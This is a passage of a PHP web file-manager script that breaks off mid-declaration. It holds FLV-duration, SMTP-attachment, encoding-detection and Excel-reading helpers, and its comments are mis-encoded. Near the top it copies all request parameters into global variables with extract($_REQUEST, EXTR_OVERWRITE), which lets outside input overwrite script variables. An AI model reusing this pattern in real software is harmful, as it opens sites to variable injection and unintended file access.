<?$Version="2.6.7";//�汾���޸ĺ������߸���
header('Content-Type:text/html; charset=GB2312');//��������
date_default_timezone_set('Asia/Chongqing');//����ʱ��
session_start();
if ($action!='httpurlupload' ){
@ob_start('ob_gzip');
}
////////////////////////////////////


if($dir==""){$dir=".";}
if(@!extract($_REQUEST, EXTR_OVERWRITE)){//����ȫ�ֱ���
@rePostGet();
}

//-----ǿ��ȫ�ֱ���--------------------
function rePostGet(){
global $_GET;
global $_POST;
foreach($_GET as $key=>$val){
global $$key;
$$key=$val;
}
foreach($_POST as $key=>$val){
global $$key;
$$key=$val;
}
}  
//-----��ȡflv ����ʱ��--------------------
function BigEndian2Int($byte_word, $signed = false) {
$int_value = 0;
        $byte_wordlen = strlen($byte_word);
        for ($i = 0; $i < $byte_wordlen; $i++)  {
            $int_value  += ord($byte_word {
                $i }
            ) * pow(256, ($byte_wordlen - 1 - $i));
             }
        if ($signed)  {
            $sign_mask_bit = 0x80 << (8 * ($byte_wordlen - 1));
            if ($int_value & $sign_mask_bit)  {
                $int_value = 0 - ($int_value & ($sign_mask_bit - 1));
                 }
             }
        return $int_value;
         }
    function getTime($name) {
        if(!file_exists($name)) {
            return;
             }
        $flv_data_length = filesize($name);
        $fp = @fopen($name, 'rb');
        $flv_header = fread($fp, 5);
        fseek($fp, 5, SEEK_SET);
        $frame_size_data_length = BigEndian2Int(fread($fp, 4));
        $flv_header_frame_length = 9;
        if ($frame_size_data_length > $flv_header_frame_length) {
            fseek($fp, $frame_size_data_length - $flv_header_frame_length, SEEK_CUR);
             }
        $duration = 0;
        while ((ftell($fp) + 1) < $flv_data_length) {
            $this_tag_header = fread($fp, 16);
            $data_length = BigEndian2Int(substr($this_tag_header, 5, 3));
            $timestamp = BigEndian2Int(substr($this_tag_header, 8, 3));
            $next_offset = ftell($fp) - 1 + $data_length;
            if ($timestamp > $duration) {
                $duration = $timestamp;
                 }
            fseek($fp, $next_offset, SEEK_SET);
             }
        fclose($fp);
        return $duration;
         }
    function fn($time) {
        $num = $time;
        $sec = intval($num / 1000);
        $h = intval($sec / 3600);
        $m = intval(($sec % 3600) / 60);
        $s = intval(($sec % 60));
        $tm = $h . ':' . $m . ':' . $s;
        return $tm;
    }
//-----��ȡ·��----------------------------
function filename(){ 
	$dir_file = $_SERVER['SCRIPT_NAME']; 
	$filename = basename($dir_file);
	$str=$_SERVER['PHP_SELF'];
	$str = ereg_replace($filename,"",$str);
	 echo $_SERVER[HTTP_HOST].$str; 
	}
//--------smtp������Ҫ����ļ�֧��----------
//       smtp_mail(������,�˿�,�û���,����,�ռ��˵�ַ, �ռ�������,����, ����, �����˵�ַ, ����������,����·��,��������){
function smtp_mail($host,$port,$hostname,$password,$sendto_email, $username,$subject, $body, $extra_hdrs, $user_name,$dir,$file){
	if(file_exists('class.phpmailer.php')){
    include('class.phpmailer.php'); 
    $mail = new PHPMailer();    
    $mail->IsSMTP();                  // send via SMTP    
    $mail->Host = $host;   // SMTP servers    
    $mail->Port = $port; 
    $mail->SMTPAuth = true;           // turn on SMTP authentication    
    $mail->Username = $hostname;     // SMTP username  ע�⣺��ͨ�ʼ���֤����Ҫ�� @����    
    $mail->Password = $password; // SMTP password    
    $mail->From = $extra_hdrs;      // ����������    
    $mail->FromName =  $user_name;  // ������    
    $mail->CharSet = "GB2312";   // ����ָ���ַ�����    
    $mail->Encoding = "base64";    
    $mail->AddAddress($sendto_email,$username);  // �ռ������������    
    $mail->AddReplyTo($extra_hdrs,$user_name);    //�ظ���
    $mail->WordWrap = 50; // set word wrap ��������    
 if(!empty($file)){     
  for($i=0;$i<=count($file)-1;$i++) {
 	 if(!is_dir($filename = "$dir/$file[$i]")){
 	 	    $mail->AddAttachment($filename); // attachment ����
 	}
 }
}
 
    $mail->IsHTML(true);  // send as HTML    
    $mail->Subject = $subject;   // �ʼ�����  
    $mail->Body = $body;   // �ʼ�����                                                                        
    $mail->AltBody ="text/html";    
    if(!@$mail->Send()) {    
        return "�ʼ�������Ϣ: " . $mail->ErrorInfo;
        exit;    
    } else {    
        return "$sendto_email �ʼ����ͳɹ�!";
    }
  }else{
  	return "����ļ�:class.phpmailer.php,class.smtp.php������.";
  }
}
//-------�ж��ļ�����-----------------------
define ('UTF32_BIG_ENDIAN_BOM'   , chr(0x00) . chr(0x00) . chr(0xFE) . chr(0xFF));
define ('UTF32_LITTLE_ENDIAN_BOM', chr(0xFF) . chr(0xFE) . chr(0x00) . chr(0x00));
define ('UTF16_BIG_ENDIAN_BOM'   , chr(0xFE) . chr(0xFF));
define ('UTF16_LITTLE_ENDIAN_BOM', chr(0xFF) . chr(0xFE));
define ('UTF8_BOM'               , chr(0xEF) . chr(0xBB) . chr(0xBF));
function get_encode($filename)
{

   $text = file_get_contents($filename);
   $first2 = substr($text, 0, 2);
   $first3 = substr($text, 0, 3);
   $first4 = substr($text, 0, 3);

   if ($first3 == UTF8_BOM)
      return 'UTF8-BOM';
   elseif ($first4 == UTF32_BIG_ENDIAN_BOM)
      return 'UTF-32BE';
   elseif ($first4 == UTF32_LITTLE_ENDIAN_BOM)
      return 'UTF-32LE';
   elseif ($first2 == UTF16_BIG_ENDIAN_BOM)
      return 'UTF-16BE';
   elseif ($first2 == UTF16_LITTLE_ENDIAN_BOM)
      return 'UTF-16LE';
   if ($text === iconv('UTF-8', 'GB2312', iconv('GB2312', 'UTF-8', $text)))
      return 'GB2312';
   if ($text === iconv('UTF-8', 'UTF-8', iconv('UTF-8', 'UTF-8', $text)))
      return 'UTF-8';
   if ($text === iconv('UTF-8', 'ASCII', iconv('ASCII', 'UTF-8', $text)))
      return 'ASCII';
      
   return 'Unknown';
}
//-------excelת��html--------------------
define('NUM_BIG_BLOCK_DEPOT_BLOCKS_POS', 0x2c); define('SMALL_BLOCK_DEPOT_BLOCK_POS', 0x3c); define('ROOT_START_BLOCK_POS', 0x30); define('BIG_BLOCK_SIZE', 0x200); define('SMALL_BLOCK_SIZE', 0x40); define('EXTENSION_BLOCK_POS', 0x44); define('NUM_EXTENSION_BLOCK_POS', 0x48); define('PROPERTY_STORAGE_BLOCK_SIZE', 0x80); define('BIG_BLOCK_DEPOT_BLOCKS_POS', 0x4c); define('SMALL_BLOCK_THRESHOLD', 0x1000); define('SIZE_OF_NAME_POS', 0x40); define('TYPE_POS', 0x42); define('START_BLOCK_POS', 0x74); define('SIZE_POS', 0x78); define('IDENTIFIER_OLE', pack("CCCCCCCC",0xd0,0xcf,0x11,0xe0,0xa1,0xb1,0x1a,0xe1)); function GetInt4d($data, $pos) { $value = ord($data[$pos]) | (ord($data[$pos+1]) << 8) | (ord($data[$pos+2]) << 16) | (ord($data[$pos+3]) << 24); if ($value>=4294967294) { $value=-2; } return $value; } function gmgetdate($ts = null){ $k = array('seconds','minutes','hours','mday','wday','mon','year','yday','weekday','month',0); return(array_comb($k,split(":",gmdate('s:i:G:j:w:n:Y:z:l:F:U',is_null($ts)?time():$ts)))); } function array_comb($array1, $array2) { $out = array(); foreach ($array1 as $key => $value) { $out[$value] = $array2[$key]; } return $out; } function v($data,$pos) { return ord($data[$pos]) | ord($data[$pos+1])<<8; } class OLERead { var $data = ''; function OLERead(){ } function read($sFileName){ if(!is_readable($sFileName)) { $this->error = 1; return false; } $this->data = @file_get_contents($sFileName); if (!$this->data) { $this->error = 1; return false; } if (substr($this->data, 0, 8) != IDENTIFIER_OLE) { $this->error = 1; return false; } $this->numBigBlockDepotBlocks = GetInt4d($this->data, NUM_BIG_BLOCK_DEPOT_BLOCKS_POS); $this->sbdStartBlock = GetInt4d($this->data, SMALL_BLOCK_DEPOT_BLOCK_POS); $this->rootStartBlock = GetInt4d($this->data, ROOT_START_BLOCK_POS); $this->extensionBlock = GetInt4d($this->data, EXTENSION_BLOCK_POS); $this->numExtensionBlocks = GetInt4d($this->data, NUM_EXTENSION_BLOCK_POS); $bigBlockDepotBlocks = array(); $pos = BIG_BLOCK_DEPOT_BLOCKS_POS; $bbdBlocks = $this->numBigBlockDepotBlocks; if ($this->numExtensionBlocks != 0) { $bbdBlocks = (BIG_BLOCK_SIZE - BIG_BLOCK_DEPOT_BLOCKS_POS)/4; } for ($i = 0; $i < $bbdBlocks; $i++) { $bigBlockDepotBlocks[$i] = GetInt4d($this->data, $pos); $pos += 4; } for ($j = 0; $j < $this->numExtensionBlocks; $j++) { $pos = ($this->extensionBlock + 1) * BIG_BLOCK_SIZE; $blocksToRead = min($this->numBigBlockDepotBlocks - $bbdBlocks, BIG_BLOCK_SIZE / 4 - 1); for ($i = $bbdBlocks; $i < $bbdBlocks + $blocksToRead; $i++) { $bigBlockDepotBlocks[$i] = GetInt4d($this->data, $pos); $pos += 4; } $bbdBlocks += $blocksToRead; if ($bbdBlocks < $this->numBigBlockDepotBlocks) { $this->extensionBlock = GetInt4d($this->data, $pos); } } $pos = 0; $index = 0; $this->bigBlockChain = array(); for ($i = 0; $i < $this->numBigBlockDepotBlocks; $i++) { $pos = ($bigBlockDepotBlocks[$i] + 1) * BIG_BLOCK_SIZE; for ($j = 0 ; $j < BIG_BLOCK_SIZE / 4; $j++) { $this->bigBlockChain[$index] = GetInt4d($this->data, $pos); $pos += 4 ; $index++; } } $pos = 0; $index = 0; $sbdBlock = $this->sbdStartBlock; $this->smallBlockChain = array(); while ($sbdBlock != -2) { $pos = ($sbdBlock + 1) * BIG_BLOCK_SIZE; for ($j = 0; $j < BIG_BLOCK_SIZE / 4; $j++) { $this->smallBlockChain[$index] = GetInt4d($this->data, $pos); $pos += 4; $index++; } $sbdBlock = $this->bigBlockChain[$sbdBlock]; } $block = $this->rootStartBlock; $pos = 0; $this->entry = $this->__readData($block); $this->__readPropertySets(); } function __readData($bl) { $block = $bl; $pos = 0; $data = ''; while ($block != -2) { $pos = ($block + 1) * BIG_BLOCK_SIZE; $data = $data.substr($this->data, $pos, BIG_BLOCK_SIZE); $block = $this->bigBlockChain[$block]; } return $data; } function __readPropertySets(){ $offset = 0; while ($offset < strlen($this->entry)) { $d = substr($this->entry, $offset, PROPERTY_STORAGE_BLOCK_SIZE); $nameSize = ord($d[SIZE_OF_NAME_POS]) | (ord($d[SIZE_OF_NAME_POS+1]) << 8); $type = ord($d[TYPE_POS]); $startBlock = GetInt4d($d, START_BLOCK_POS); $size = GetInt4d($d, SIZE_POS); $name = ''; for ($i = 0; $i < $nameSize ; $i++) { $name .= $d[$i]; } $name = str_replace("\x00", "", $name); $this->props[] = array ( 'name' => $name, 'type' => $type, 'startBlock' => $startBlock, 'size' => $size); if ((strtolower($name) == "workbook") || ( strtolower($name) == "book")) { $this->wrkbook = count($this->props) - 1; } if ($name == "Root Entry") { $this->rootentry = count($this->props) - 1; } $offset += PROPERTY_STORAGE_BLOCK_SIZE; } } function getWorkBook(){ if ($this->props[$this->wrkbook]['size'] < SMALL_BLOCK_THRESHOLD){ $rootdata = $this->__readData($this->props[$this->rootentry]['startBlock']); $streamData = ''; $block = $this->props[$this->wrkbook]['startBlock']; $pos = 0; while ($block != -2) { $pos = $block * SMALL_BLOCK_SIZE; $streamData .= substr($rootdata, $pos, SMALL_BLOCK_SIZE); $block = $this->smallBlockChain[$block]; } return $streamData; }else{ $numBlocks = $this->props[$this->wrkbook]['size'] / BIG_BLOCK_SIZE; if ($this->props[$this->wrkbook]['size'] % BIG_BLOCK_SIZE != 0) { $numBlocks++; } if ($numBlocks == 0) return ''; $streamData = ''; $block = $this->props[$this->wrkbook]['startBlock']; $pos = 0; while ($block != -2) { $pos = ($block + 1) * BIG_BLOCK_SIZE; $streamData .= substr($this->data, $pos, BIG_BLOCK_SIZE); $block = $this->bigBlockChain[$block]; } return $streamData; } } } define('SPREADSHEET_EXCEL_READER_BIFF8', 0x600); define('SPREADSHEET_EXCEL_READER_BIFF7', 0x500); define('SPREADSHEET_EXCEL_READER_WORKBOOKGLOBALS', 0x5); define('SPREADSHEET_EXCEL_READER_WORKSHEET', 0x10); define('SPREADSHEET_EXCEL_READER_TYPE_BOF', 0x809); define('SPREADSHEET_EXCEL_READER_TYPE_EOF', 0x0a); define('SPREADSHEET_EXCEL_READER_TYPE_BOUNDSHEET', 0x85); define('SPREADSHEET_EXCEL_READER_TYPE_DIMENSION', 0x200); define('SPREADSHEET_EXCEL_READER_TYPE_ROW', 0x208); define('SPREADSHEET_EXCEL_READER_TYPE_DBCELL', 0xd7); define('SPREADSHEET_EXCEL_READER_TYPE_FILEPASS', 0x2f); define('SPREADSHEET_EXCEL_READER_TYPE_NOTE', 0x1c); define('SPREADSHEET_EXCEL_READER_TYPE_TXO', 0x1b6); define('SPREADSHEET_EXCEL_READER_TYPE_RK', 0x7e); define('SPREADSHEET_EXCEL_READER_TYPE_RK2', 0x27e); define('SPREADSHEET_EXCEL_READER_TYPE_MULRK', 0xbd); define('SPREADSHEET_EXCEL_READER_TYPE_MULBLANK', 0xbe); define('SPREADSHEET_EXCEL_READER_TYPE_INDEX', 0x20b); define('SPREADSHEET_EXCEL_READER_TYPE_SST', 0xfc); define('SPREADSHEET_EXCEL_READER_TYPE_EXTSST', 0xff); define('SPREADSHEET_EXCEL_READER_TYPE_CONTINUE', 0x3c); define('SPREADSHEET_EXCEL_READER_TYPE_LABEL', 0x204); define('SPREADSHEET_EXCEL_READER_TYPE_LABELSST', 0xfd); define('SPREADSHEET_EXCEL_READER_TYPE_NUMBER', 0x203); define('SPREADSHEET_EXCEL_READER_TYPE_NAME', 0x18); define('SPREADSHEET_EXCEL_READER_TYPE_ARRAY', 0x221); define('SPREADSHEET_EXCEL_READER_TYPE_STRING', 0x207); define('SPREADSHEET_EXCEL_READER_TYPE_FORMULA', 0x406); define('SPREADSHEET_EXCEL_READER_TYPE_FORMULA2', 0x6); define('SPREADSHEET_EXCEL_READER_TYPE_FORMAT', 0x41e); define('SPREADSHEET_EXCEL_READER_TYPE_XF', 0xe0); define('SPREADSHEET_EXCEL_READER_TYPE_BOOLERR', 0x205); define('SPREADSHEET_EXCEL_READER_TYPE_FONT', 0x0031); define('SPREADSHEET_EXCEL_READER_TYPE_PALETTE', 0x0092); define('SPREADSHEET_EXCEL_READER_TYPE_UNKNOWN', 0xffff); define('SPREADSHEET_EXCEL_READER_TYPE_NINETEENFOUR', 0x22); define('SPREADSHEET_EXCEL_READER_TYPE_MERGEDCELLS', 0xE5); define('SPREADSHEET_EXCEL_READER_UTCOFFSETDAYS' , 25569); define('SPREADSHEET_EXCEL_READER_UTCOFFSETDAYS1904', 24107); define('SPREADSHEET_EXCEL_READER_MSINADAY', 86400); define('SPREADSHEET_EXCEL_READER_TYPE_HYPER', 0x01b8); define('SPREADSHEET_EXCEL_READER_TYPE_COLINFO', 0x7d); define('SPREADSHEET_EXCEL_READER_TYPE_DEFCOLWIDTH', 0x55); define('SPREADSHEET_EXCEL_READER_TYPE_STANDARDWIDTH', 0x99); define('SPREADSHEET_EXCEL_READER_DEF_NUM_FORMAT', "%s"); class Spreadsheet_Excel_Reader { var $colnames = array(); var $colindexes = array(); var $standardColWidth = 0; var $defaultColWidth = 0; function myHex($d) { if ($d < 16) return "0" . dechex($d); return dechex($d); } function dumpHexData($data, $pos, $length) { $info = ""; for ($i = 0; $i <= $length; $i++) { $info .= ($i==0?"":" ") . $this->myHex(ord($data[$pos + $i])) . (ord($data[$pos + $i])>31? "[" . $data[$pos + $i] . "]":''); } return $info; } function getCol($col) { if (is_string($col)) { $col = strtolower($col); if (array_key_exists($col,$this->colnames)) { $col = $this->colnames[$col]; } } return $col; } function val($row,$col,$sheet=0) { $col = $this->getCol($col); if (array_key_exists($row,$this->sheets[$sheet]['cells']) && array_key_exists($col,$this->sheets[$sheet]['cells'][$row])) { return $this->sheets[$sheet]['cells'][$row][$col]; } return ""; } function value($row,$col,$sheet=0) { return $this->val($row,$col,$sheet); } function info($row,$col,$type='',$sheet=0) { $col = $this->getCol($col); if (array_key_exists('cellsInfo',$this->sheets[$sheet]) && array_key_exists($row,$this->sheets[$sheet]['cellsInfo']) && array_key_exists($col,$this->sheets[$sheet]['cellsInfo'][$row]) && array_key_exists($type,$this->sheets[$sheet]['cellsInfo'][$row][$col])) { return $this->sheets[$sheet]['cellsInfo'][$row][$col][$type]; } return ""; } function type($row,$col,$sheet=0) { return $this->info($row,$col,'type',$sheet); } function raw($row,$col,$sheet=0) { return $this->info($row,$col,'raw',$sheet); } function rowspan($row,$col,$sheet=0) { $val = $this->info($row,$col,'rowspan',$sheet); if ($val=="") { return 1; } return $val; } function colspan($row,$col,$sheet=0) { $val = $this->info($row,$col,'colspan',$sheet); if ($val=="") { return 1; } return $val; } function hyperlink($row,$col,$sheet=0) { $link = $this->sheets[$sheet]['cellsInfo'][$row][$col]['hyperlink']; if ($link) { return $link['link']; } return ''; } function rowcount($sheet=0) { return $this->sheets[$sheet]['numRows']; } function colcount($sheet=0) { return $this->sheets[$sheet]['numCols']; } function colwidth($col,$sheet=0) { return $this->colInfo[$sheet][$col]['width']/9142*200; } function colhidden($col,$sheet=0) { return !!$this->colInfo[$sheet][$col]['hidden']; } function rowheight($row,$sheet=0) { return $this->rowInfo[$sheet][$row]['height']; } function rowhidden($row,$sheet=0) { return !!$this->rowInfo[$sheet][$row]['hidden']; } function style($row,$col,$sheet=0,$properties='') { $css = ""; $font=$this->font($row,$col,$sheet); if ($font!="") { $css .= "font-family:$font;"; } $align=$this->align($row,$col,$sheet); if ($align!="") { $css .= "text-align:$align;"; } $height=$this->height($row,$col,$sheet); if ($height!="") { $css .= "font-size:$height"."px;"; } $bgcolor=$this->bgColor($row,$col,$sheet); if ($bgcolor!="") { $bgcolor = $this->colors[$bgcolor]; $css .= "background-color:$bgcolor;"; } $color=$this->color($row,$col,$sheet); if ($color!="") { $css .= "color:$color;"; } $bold=$this->bold($row,$col,$sheet); if ($bold) { $css .= "font-weight:bold;"; } $italic=$this->italic($row,$col,$sheet); if ($italic) { $css .= "font-style:italic;"; } $underline=$this->underline($row,$col,$sheet); if ($underline) { $css .= "text-decoration:underline;"; } $bLeft = $this->borderLeft($row,$col,$sheet); $bRight = $this->borderRight($row,$col,$sheet); $bTop = $this->borderTop($row,$col,$sheet); $bBottom = $this->borderBottom($row,$col,$sheet); $bLeftCol = $this->borderLeftColor($row,$col,$sheet); $bRightCol = $this->borderRightColor($row,$col,$sheet); $bTopCol = $this->borderTopColor($row,$col,$sheet); $bBottomCol = $this->borderBottomColor($row,$col,$sheet); if ($bLeft!="" && $bLeft==$bRight && $bRight==$bTop && $bTop==$bBottom) { $css .= "border:" . $this->lineStylesCss[$bLeft] .";"; } else { if ($bLeft!="") { $css .= "border-left:" . $this->lineStylesCss[$bLeft] .";"; } if ($bRight!="") { $css .= "border-right:" . $this->lineStylesCss[$bRight] .";"; } if ($bTop!="") { $css .= "border-top:" . $this->lineStylesCss[$bTop] .";"; } if ($bBottom!="") { $css .= "border-bottom:" . $this->lineStylesCss[$bBottom] .";"; } } if ($bLeft!="" && $bLeftCol!="") { $css .= "border-left-color:" . $bLeftCol .";"; } if ($bRight!="" && $bRightCol!="") { $css .= "border-right-color:" . $bRightCol .";"; } if ($bTop!="" && $bTopCol!="") { $css .= "border-top-color:" . $bTopCol . ";"; } if ($bBottom!="" && $bBottomCol!="") { $css .= "border-bottom-color:" . $bBottomCol .";"; } return $css; } function format($row,$col,$sheet=0) { return $this->info($row,$col,'format',$sheet); } function formatIndex($row,$col,$sheet=0) { return $this->info($row,$col,'formatIndex',$sheet); } function formatColor($row,$col,$sheet=0) { return $this->info($row,$col,'formatColor',$sheet); } function xfRecord($row,$col,$sheet=0) { $xfIndex = $this->info($row,$col,'xfIndex',$sheet); if ($xfIndex!="") { return $this->xfRecords[$xfIndex]; } return null; } function xfProperty($row,$col,$sheet,$prop) { $xfRecord = $this->xfRecord($row,$col,$sheet); if ($xfRecord!=null) { return $xfRecord[$prop]; } return ""; } function align($row,$col,$sheet=0) { return $this->xfProperty($row,$col,$sheet,'align'); } function bgColor($row,$col,$sheet=0) { return $this->xfProperty($row,$col,$sheet,'bgColor'); } function borderLeft($row,$col,$sheet=0) { return $this->xfProperty($row,$col,$sheet,'borderLeft'); } function borderRight($row,$col,$sheet=0) { return $this->xfProperty($row,$col,$sheet,'borderRight'); } function borderTop($row,$col,$sheet=0) { return $this->xfProperty($row,$col,$sheet,'borderTop'); } function borderBottom($row,$col,$sheet=0) { return $this->xfProperty($row,$col,$sheet,'borderBottom'); } function borderLeftColor($row,$col,$sheet=0) { return $this->colors[$this->xfProperty($row,$col,$sheet,'borderLeftColor')]; } function borderRightColor($row,$col,$sheet=0) { return $this->colors[$this->xfProperty($row,$col,$sheet,'borderRightColor')]; } function borderTopColor($row,$col,$sheet=0) { return $this->colors[$this->xfProperty($row,$col,$sheet,'borderTopColor')]; } function borderBottomColor($row,$col,$sheet=0) { return $this->colors[$this->xfProperty($row,$col,$sheet,'borderBottomColor')]; } function fontRecord($row,$col,$sheet=0) { $xfRecord = $this->xfRecord($row,$col,$sheet); if ($xfRecord!=null) { $font = $xfRecord['fontIndex']; if ($font!=null) { return $this->fontRecords[$font]; } } return null; } function fontProperty($row,$col,$sheet=0,$prop) { $font = $this->fontRecord($row,$col,$sheet); if ($font!=null) { return $font[$prop]; } return false; } function fontIndex($row,$col,$sheet=0) { return $this->xfProperty($row,$col,$sheet,'fontIndex'); } function color($row,$col,$sheet=0) { $formatColor = $this->formatColor($row,$col,$sheet); if ($formatColor!="") { return $formatColor; } $ci = $this->fontProperty($row,$col,$sheet,'color'); return $this->rawColor($ci); } function rawColor($ci) { if (($ci <> 0x7FFF) && ($ci <> '')) { return $this->colors[$ci]; } return ""; } function bold($row,$col,$sheet=0) { return $this->fontProperty($row,$col,$sheet,'bold'); } function italic($row,$col,$sheet=0) { return $this->fontProperty($row,$col,$sheet,'italic'); } function underline($row,$col,$sheet=0) { return $this->fontProperty($row,$col,$sheet,'under'); } function height($row,$col,$sheet=0) { return $this->fontProperty($row,$col,$sheet,'height'); } function font($row,$col,$sheet=0) { return $this->fontProperty($row,$col,$sheet,'font'); } function dump($row_numbers=false,$col_letters=false,$sheet=0,$table_class='excel') { $out = "<table class=\"$table_class\" cellspacing=0>"; if ($col_letters) { $out .= "<thead>\n\t<tr>"; if ($row_numbers) { $out .= "\n\t\t<th>&nbsp</th>"; } for($i=1;$i<=$this->colcount($sheet);$i++) { $style = "width:" . ($this->colwidth($i,$sheet)*1) . "px;"; if ($this->colhidden($i,$sheet)) { $style .= "display:none;"; } $out .= "\n\t\t<th style=\"$style\">" . strtoupper($this->colindexes[$i]) . "</th>"; } $out .= "</tr></thead>\n"; } $out .= "<tbody>\n"; for($row=1;$row<=$this->rowcount($sheet);$row++) { $rowheight = $this->rowheight($row,$sheet); $style = "height:" . ($rowheight*(4/3)) . "px;"; if ($this->rowhidden($row,$sheet)) { $style .= "display:none;"; } $out .= "\n\t<tr style=\"$style\">"; if ($row_numbers) { $out .= "\n\t\t<th>$row</th>"; } for($col=1;$col<=$this->colcount($sheet);$col++) { $rowspan = $this->rowspan($row,$col,$sheet); $colspan = $this->colspan($row,$col,$sheet); for($i=0;$i<$rowspan;$i++) { for($j=0;$j<$colspan;$j++) { if ($i>0 || $j>0) { $this->sheets[$sheet]['cellsInfo'][$row+$i][$col+$j]['dontprint']=1; } } } if(!$this->sheets[$sheet]['cellsInfo'][$row][$col]['dontprint']) { $style = $this->style($row,$col,$sheet); if ($this->colhidden($col,$sheet)) { $style .= "display:none;"; } $out .= "\n\t\t<td style=\"$style\"" . ($colspan > 1?" colspan=$colspan":"") . ($rowspan > 1?" rowspan=$rowspan":"") . ">"; $val = $this->val($row,$col,$sheet); if ($val=='') { $val="&nbsp;"; } else { $val = htmlspecialchars($val); $link = $this->hyperlink($row,$col,$sheet); if ($link!='') { $val = "<a href=\"$link\">$val</a>"; } } $out .= "<nobr>".nl2br($val)."</nobr>"; $out .= "</td>"; } } $out .= "</tr>\n"; } $out .= "</tbody></table>"; return $out; } var $boundsheets = array(); var $formatRecords = array(); var $fontRecords = array(); var $xfRecords = array(); var $colInfo = array(); var $rowInfo = array(); var $sst = array(); var $sheets = array(); var $data; var $_ole; var $_defaultEncoding = "GB2312"; var $_defaultFormat = SPREADSHEET_EXCEL_READER_DEF_NUM_FORMAT; var $_columnsFormat = array(); var $_rowoffset = 1; var $_coloffset = 1; var $dateFormats = array ( 0xe => "m/d/Y", 0xf => "M-d-Y", 0x10 => "d-M", 0x11 => "M-Y", 0x12 => "h:i a", 0x13 => "h:i:s a", 0x14 => "H:i", 0x15 => "H:i:s", 0x16 => "d/m/Y H:i", 0x2d => "i:s", 0x2e => "H:i:s", 0x2f => "i:s.S" ); var $numberFormats = array( 0x1 => "0", 0x2 => "0.00", 0x3 => "#,##0", 0x4 => "#,##0.00", 0x5 => "\$#,##0;(\$#,##0)", 0x6 => "\$#,##0;[Red](\$#,##0)", 0x7 => "\$#,##0.00;(\$#,##0.00)", 0x8 => "\$#,##0.00;[Red](\$#,##0.00)", 0x9 => "0%", 0xa => "0.00%", 0xb => "0.00E+00", 0x25 => "#,##0;(#,##0)", 0x26 => "#,##0;[Red](#,##0)", 0x27 => "#,##0.00;(#,##0.00)", 0x28 => "#,##0.00;[Red](#,##0.00)", 0x29 => "#,##0;(#,##0)", 0x2a => "\$#,##0;(\$#,##0)", 0x2b => "#,##0.00;(#,##0.00)", 0x2c => "\$#,##0.00;(\$#,##0.00)", 0x30 => "##0.0E+0" ); var $colors = Array( 0x00 => "#000000", 0x01 => "#FFFFFF", 0x02 => "#FF0000", 0x03 => "#00FF00", 0x04 => "#0000FF", 0x05 => "#FFFF00", 0x06 => "#FF00FF", 0x07 => "#00FFFF", 0x08 => "#000000", 0x09 => "#FFFFFF", 0x0A => "#FF0000", 0x0B => "#00FF00", 0x0C => "#0000FF", 0x0D => "#FFFF00", 0x0E => "#FF00FF", 0x0F => "#00FFFF", 0x10 => "#800000", 0x11 => "#008000", 0x12 => "#000080", 0x13 => "#808000", 0x14 => "#800080", 0x15 => "#008080", 0x16 => "#C0C0C0", 0x17 => "#808080", 0x18 => "#9999FF", 0x19 => "#993366", 0x1A => "#FFFFCC", 0x1B => "#CCFFFF", 0x1C => "#660066", 0x1D => "#FF8080", 0x1E => "#0066CC", 0x1F => "#CCCCFF", 0x20 => "#000080", 0x21 => "#FF00FF", 0x22 => "#FFFF00", 0x23 => "#00FFFF", 0x24 => "#800080", 0x25 => "#800000", 0x26 => "#008080", 0x27 => "#0000FF", 0x28 => "#00CCFF", 0x29 => "#CCFFFF", 0x2A => "#CCFFCC", 0x2B => "#FFFF99", 0x2C => "#99CCFF", 0x2D => "#FF99CC", 0x2E => "#CC99FF", 0x2F => "#FFCC99", 0x30 => "#3366FF", 0x31 => "#33CCCC", 0x32 => "#99CC00", 0x33 => "#FFCC00", 0x34 => "#FF9900", 0x35 => "#FF6600", 0x36 => "#666699", 0x37 => "#969696", 0x38 => "#003366", 0x39 => "#339966", 0x3A => "#003300", 0x3B => "#333300", 0x3C => "#993300", 0x3D => "#993366", 0x3E => "#333399", 0x3F => "#333333", 0x40 => "#000000", 0x41 => "#FFFFFF", 0x43 => "#000000", 0x4D => "#000000", 0x4E => "#FFFFFF", 0x4F => "#000000", 0x50 => "#FFFFFF", 0x51 => "#000000", 0x7FFF => "#000000" ); var $lineStyles = array( 0x00 => "", 0x01 => "Thin", 0x02 => "Medium", 0x03 => "Dashed", 0x04 => "Dotted", 0x05 => "Thick", 0x06 => "Double", 0x07 => "Hair", 0x08 => "Medium dashed", 0x09 => "Thin dash-dotted", 0x0A => "Medium dash-dotted", 0x0B => "Thin dash-dot-dotted", 0x0C => "Medium dash-dot-dotted", 0x0D => "Slanted medium dash-dotted" ); var $lineStylesCss = array( "Thin" => "1px solid", "Medium" => "2px solid", "Dashed" => "1px dashed", "Dotted" => "1px dotted", "Thick" => "3px solid", "Double" => "double", "Hair" => "1px solid", "Medium dashed" => "2px dashed", "Thin dash-dotted" => "1px dashed", "Medium dash-dotted" => "2px dashed", "Thin dash-dot-dotted" => "1px dashed", "Medium dash-dot-dotted" => "2px dashed", "Slanted medium dash-dotte" => "2px dashed" ); function read16bitstring($data, $start) { $len = 0; while (ord($data[$start + $len]) + ord($data[$start + $len + 1]) > 0) $len++; return substr($data, $start, $len); } function _format_value($format,$num,$f) { if ( (!$f && $format=="%s") || ($f==49) || ($format=="GENERAL") ) { return array('string'=>$num, 'formatColor'=>null); } $parts = split(";",$format); $pattern = $parts[0]; if (count($parts)>2 && $num==0) { $pattern = $parts[2]; } if (count($parts)>1 && $num<0) { $pattern = $parts[1]; $num = abs($num); } $color = ""; $matches = array(); $color_regex = "/^\[(BLACK|BLUE|CYAN|GREEN|MAGENTA|RED|WHITE|YELLOW)\]/i"; if (preg_match($color_regex,$pattern,$matches)) { $color = strtolower($matches[1]); $pattern = preg_replace($color_regex,"",$pattern); } $pattern = preg_replace("/_./","",$pattern); $pattern = preg_replace("/\\\/","",$pattern); $pattern = preg_replace("/\"/","",$pattern); $pattern = preg_replace("/\#/","0",$pattern); $has_commas = preg_match("/,/",$pattern); if ($has_commas) { $pattern = preg_replace("/,/","",$pattern); } if (preg_match("/\d(\%)([^\%]|$)/",$pattern,$matches)) { $num = $num * 100; $pattern = preg_replace("/(\d)(\%)([^\%]|$)/","$1%$3",$pattern); } $number_regex = "/(\d+)(\.?)(\d*)/"; if (preg_match($number_regex,$pattern,$matches)) { $left = $matches[1]; $dec = $matches[2]; $right = $matches[3]; if ($has_commas) { $formatted = number_format($num,strlen($right)); } else { $sprintf_pattern = "%1.".strlen($right)."f"; $formatted = sprintf($sprintf_pattern, $num); } $pattern = preg_replace($number_regex, $formatted, $pattern); } return array( 'string'=>$pattern, 'formatColor'=>$color ); } function 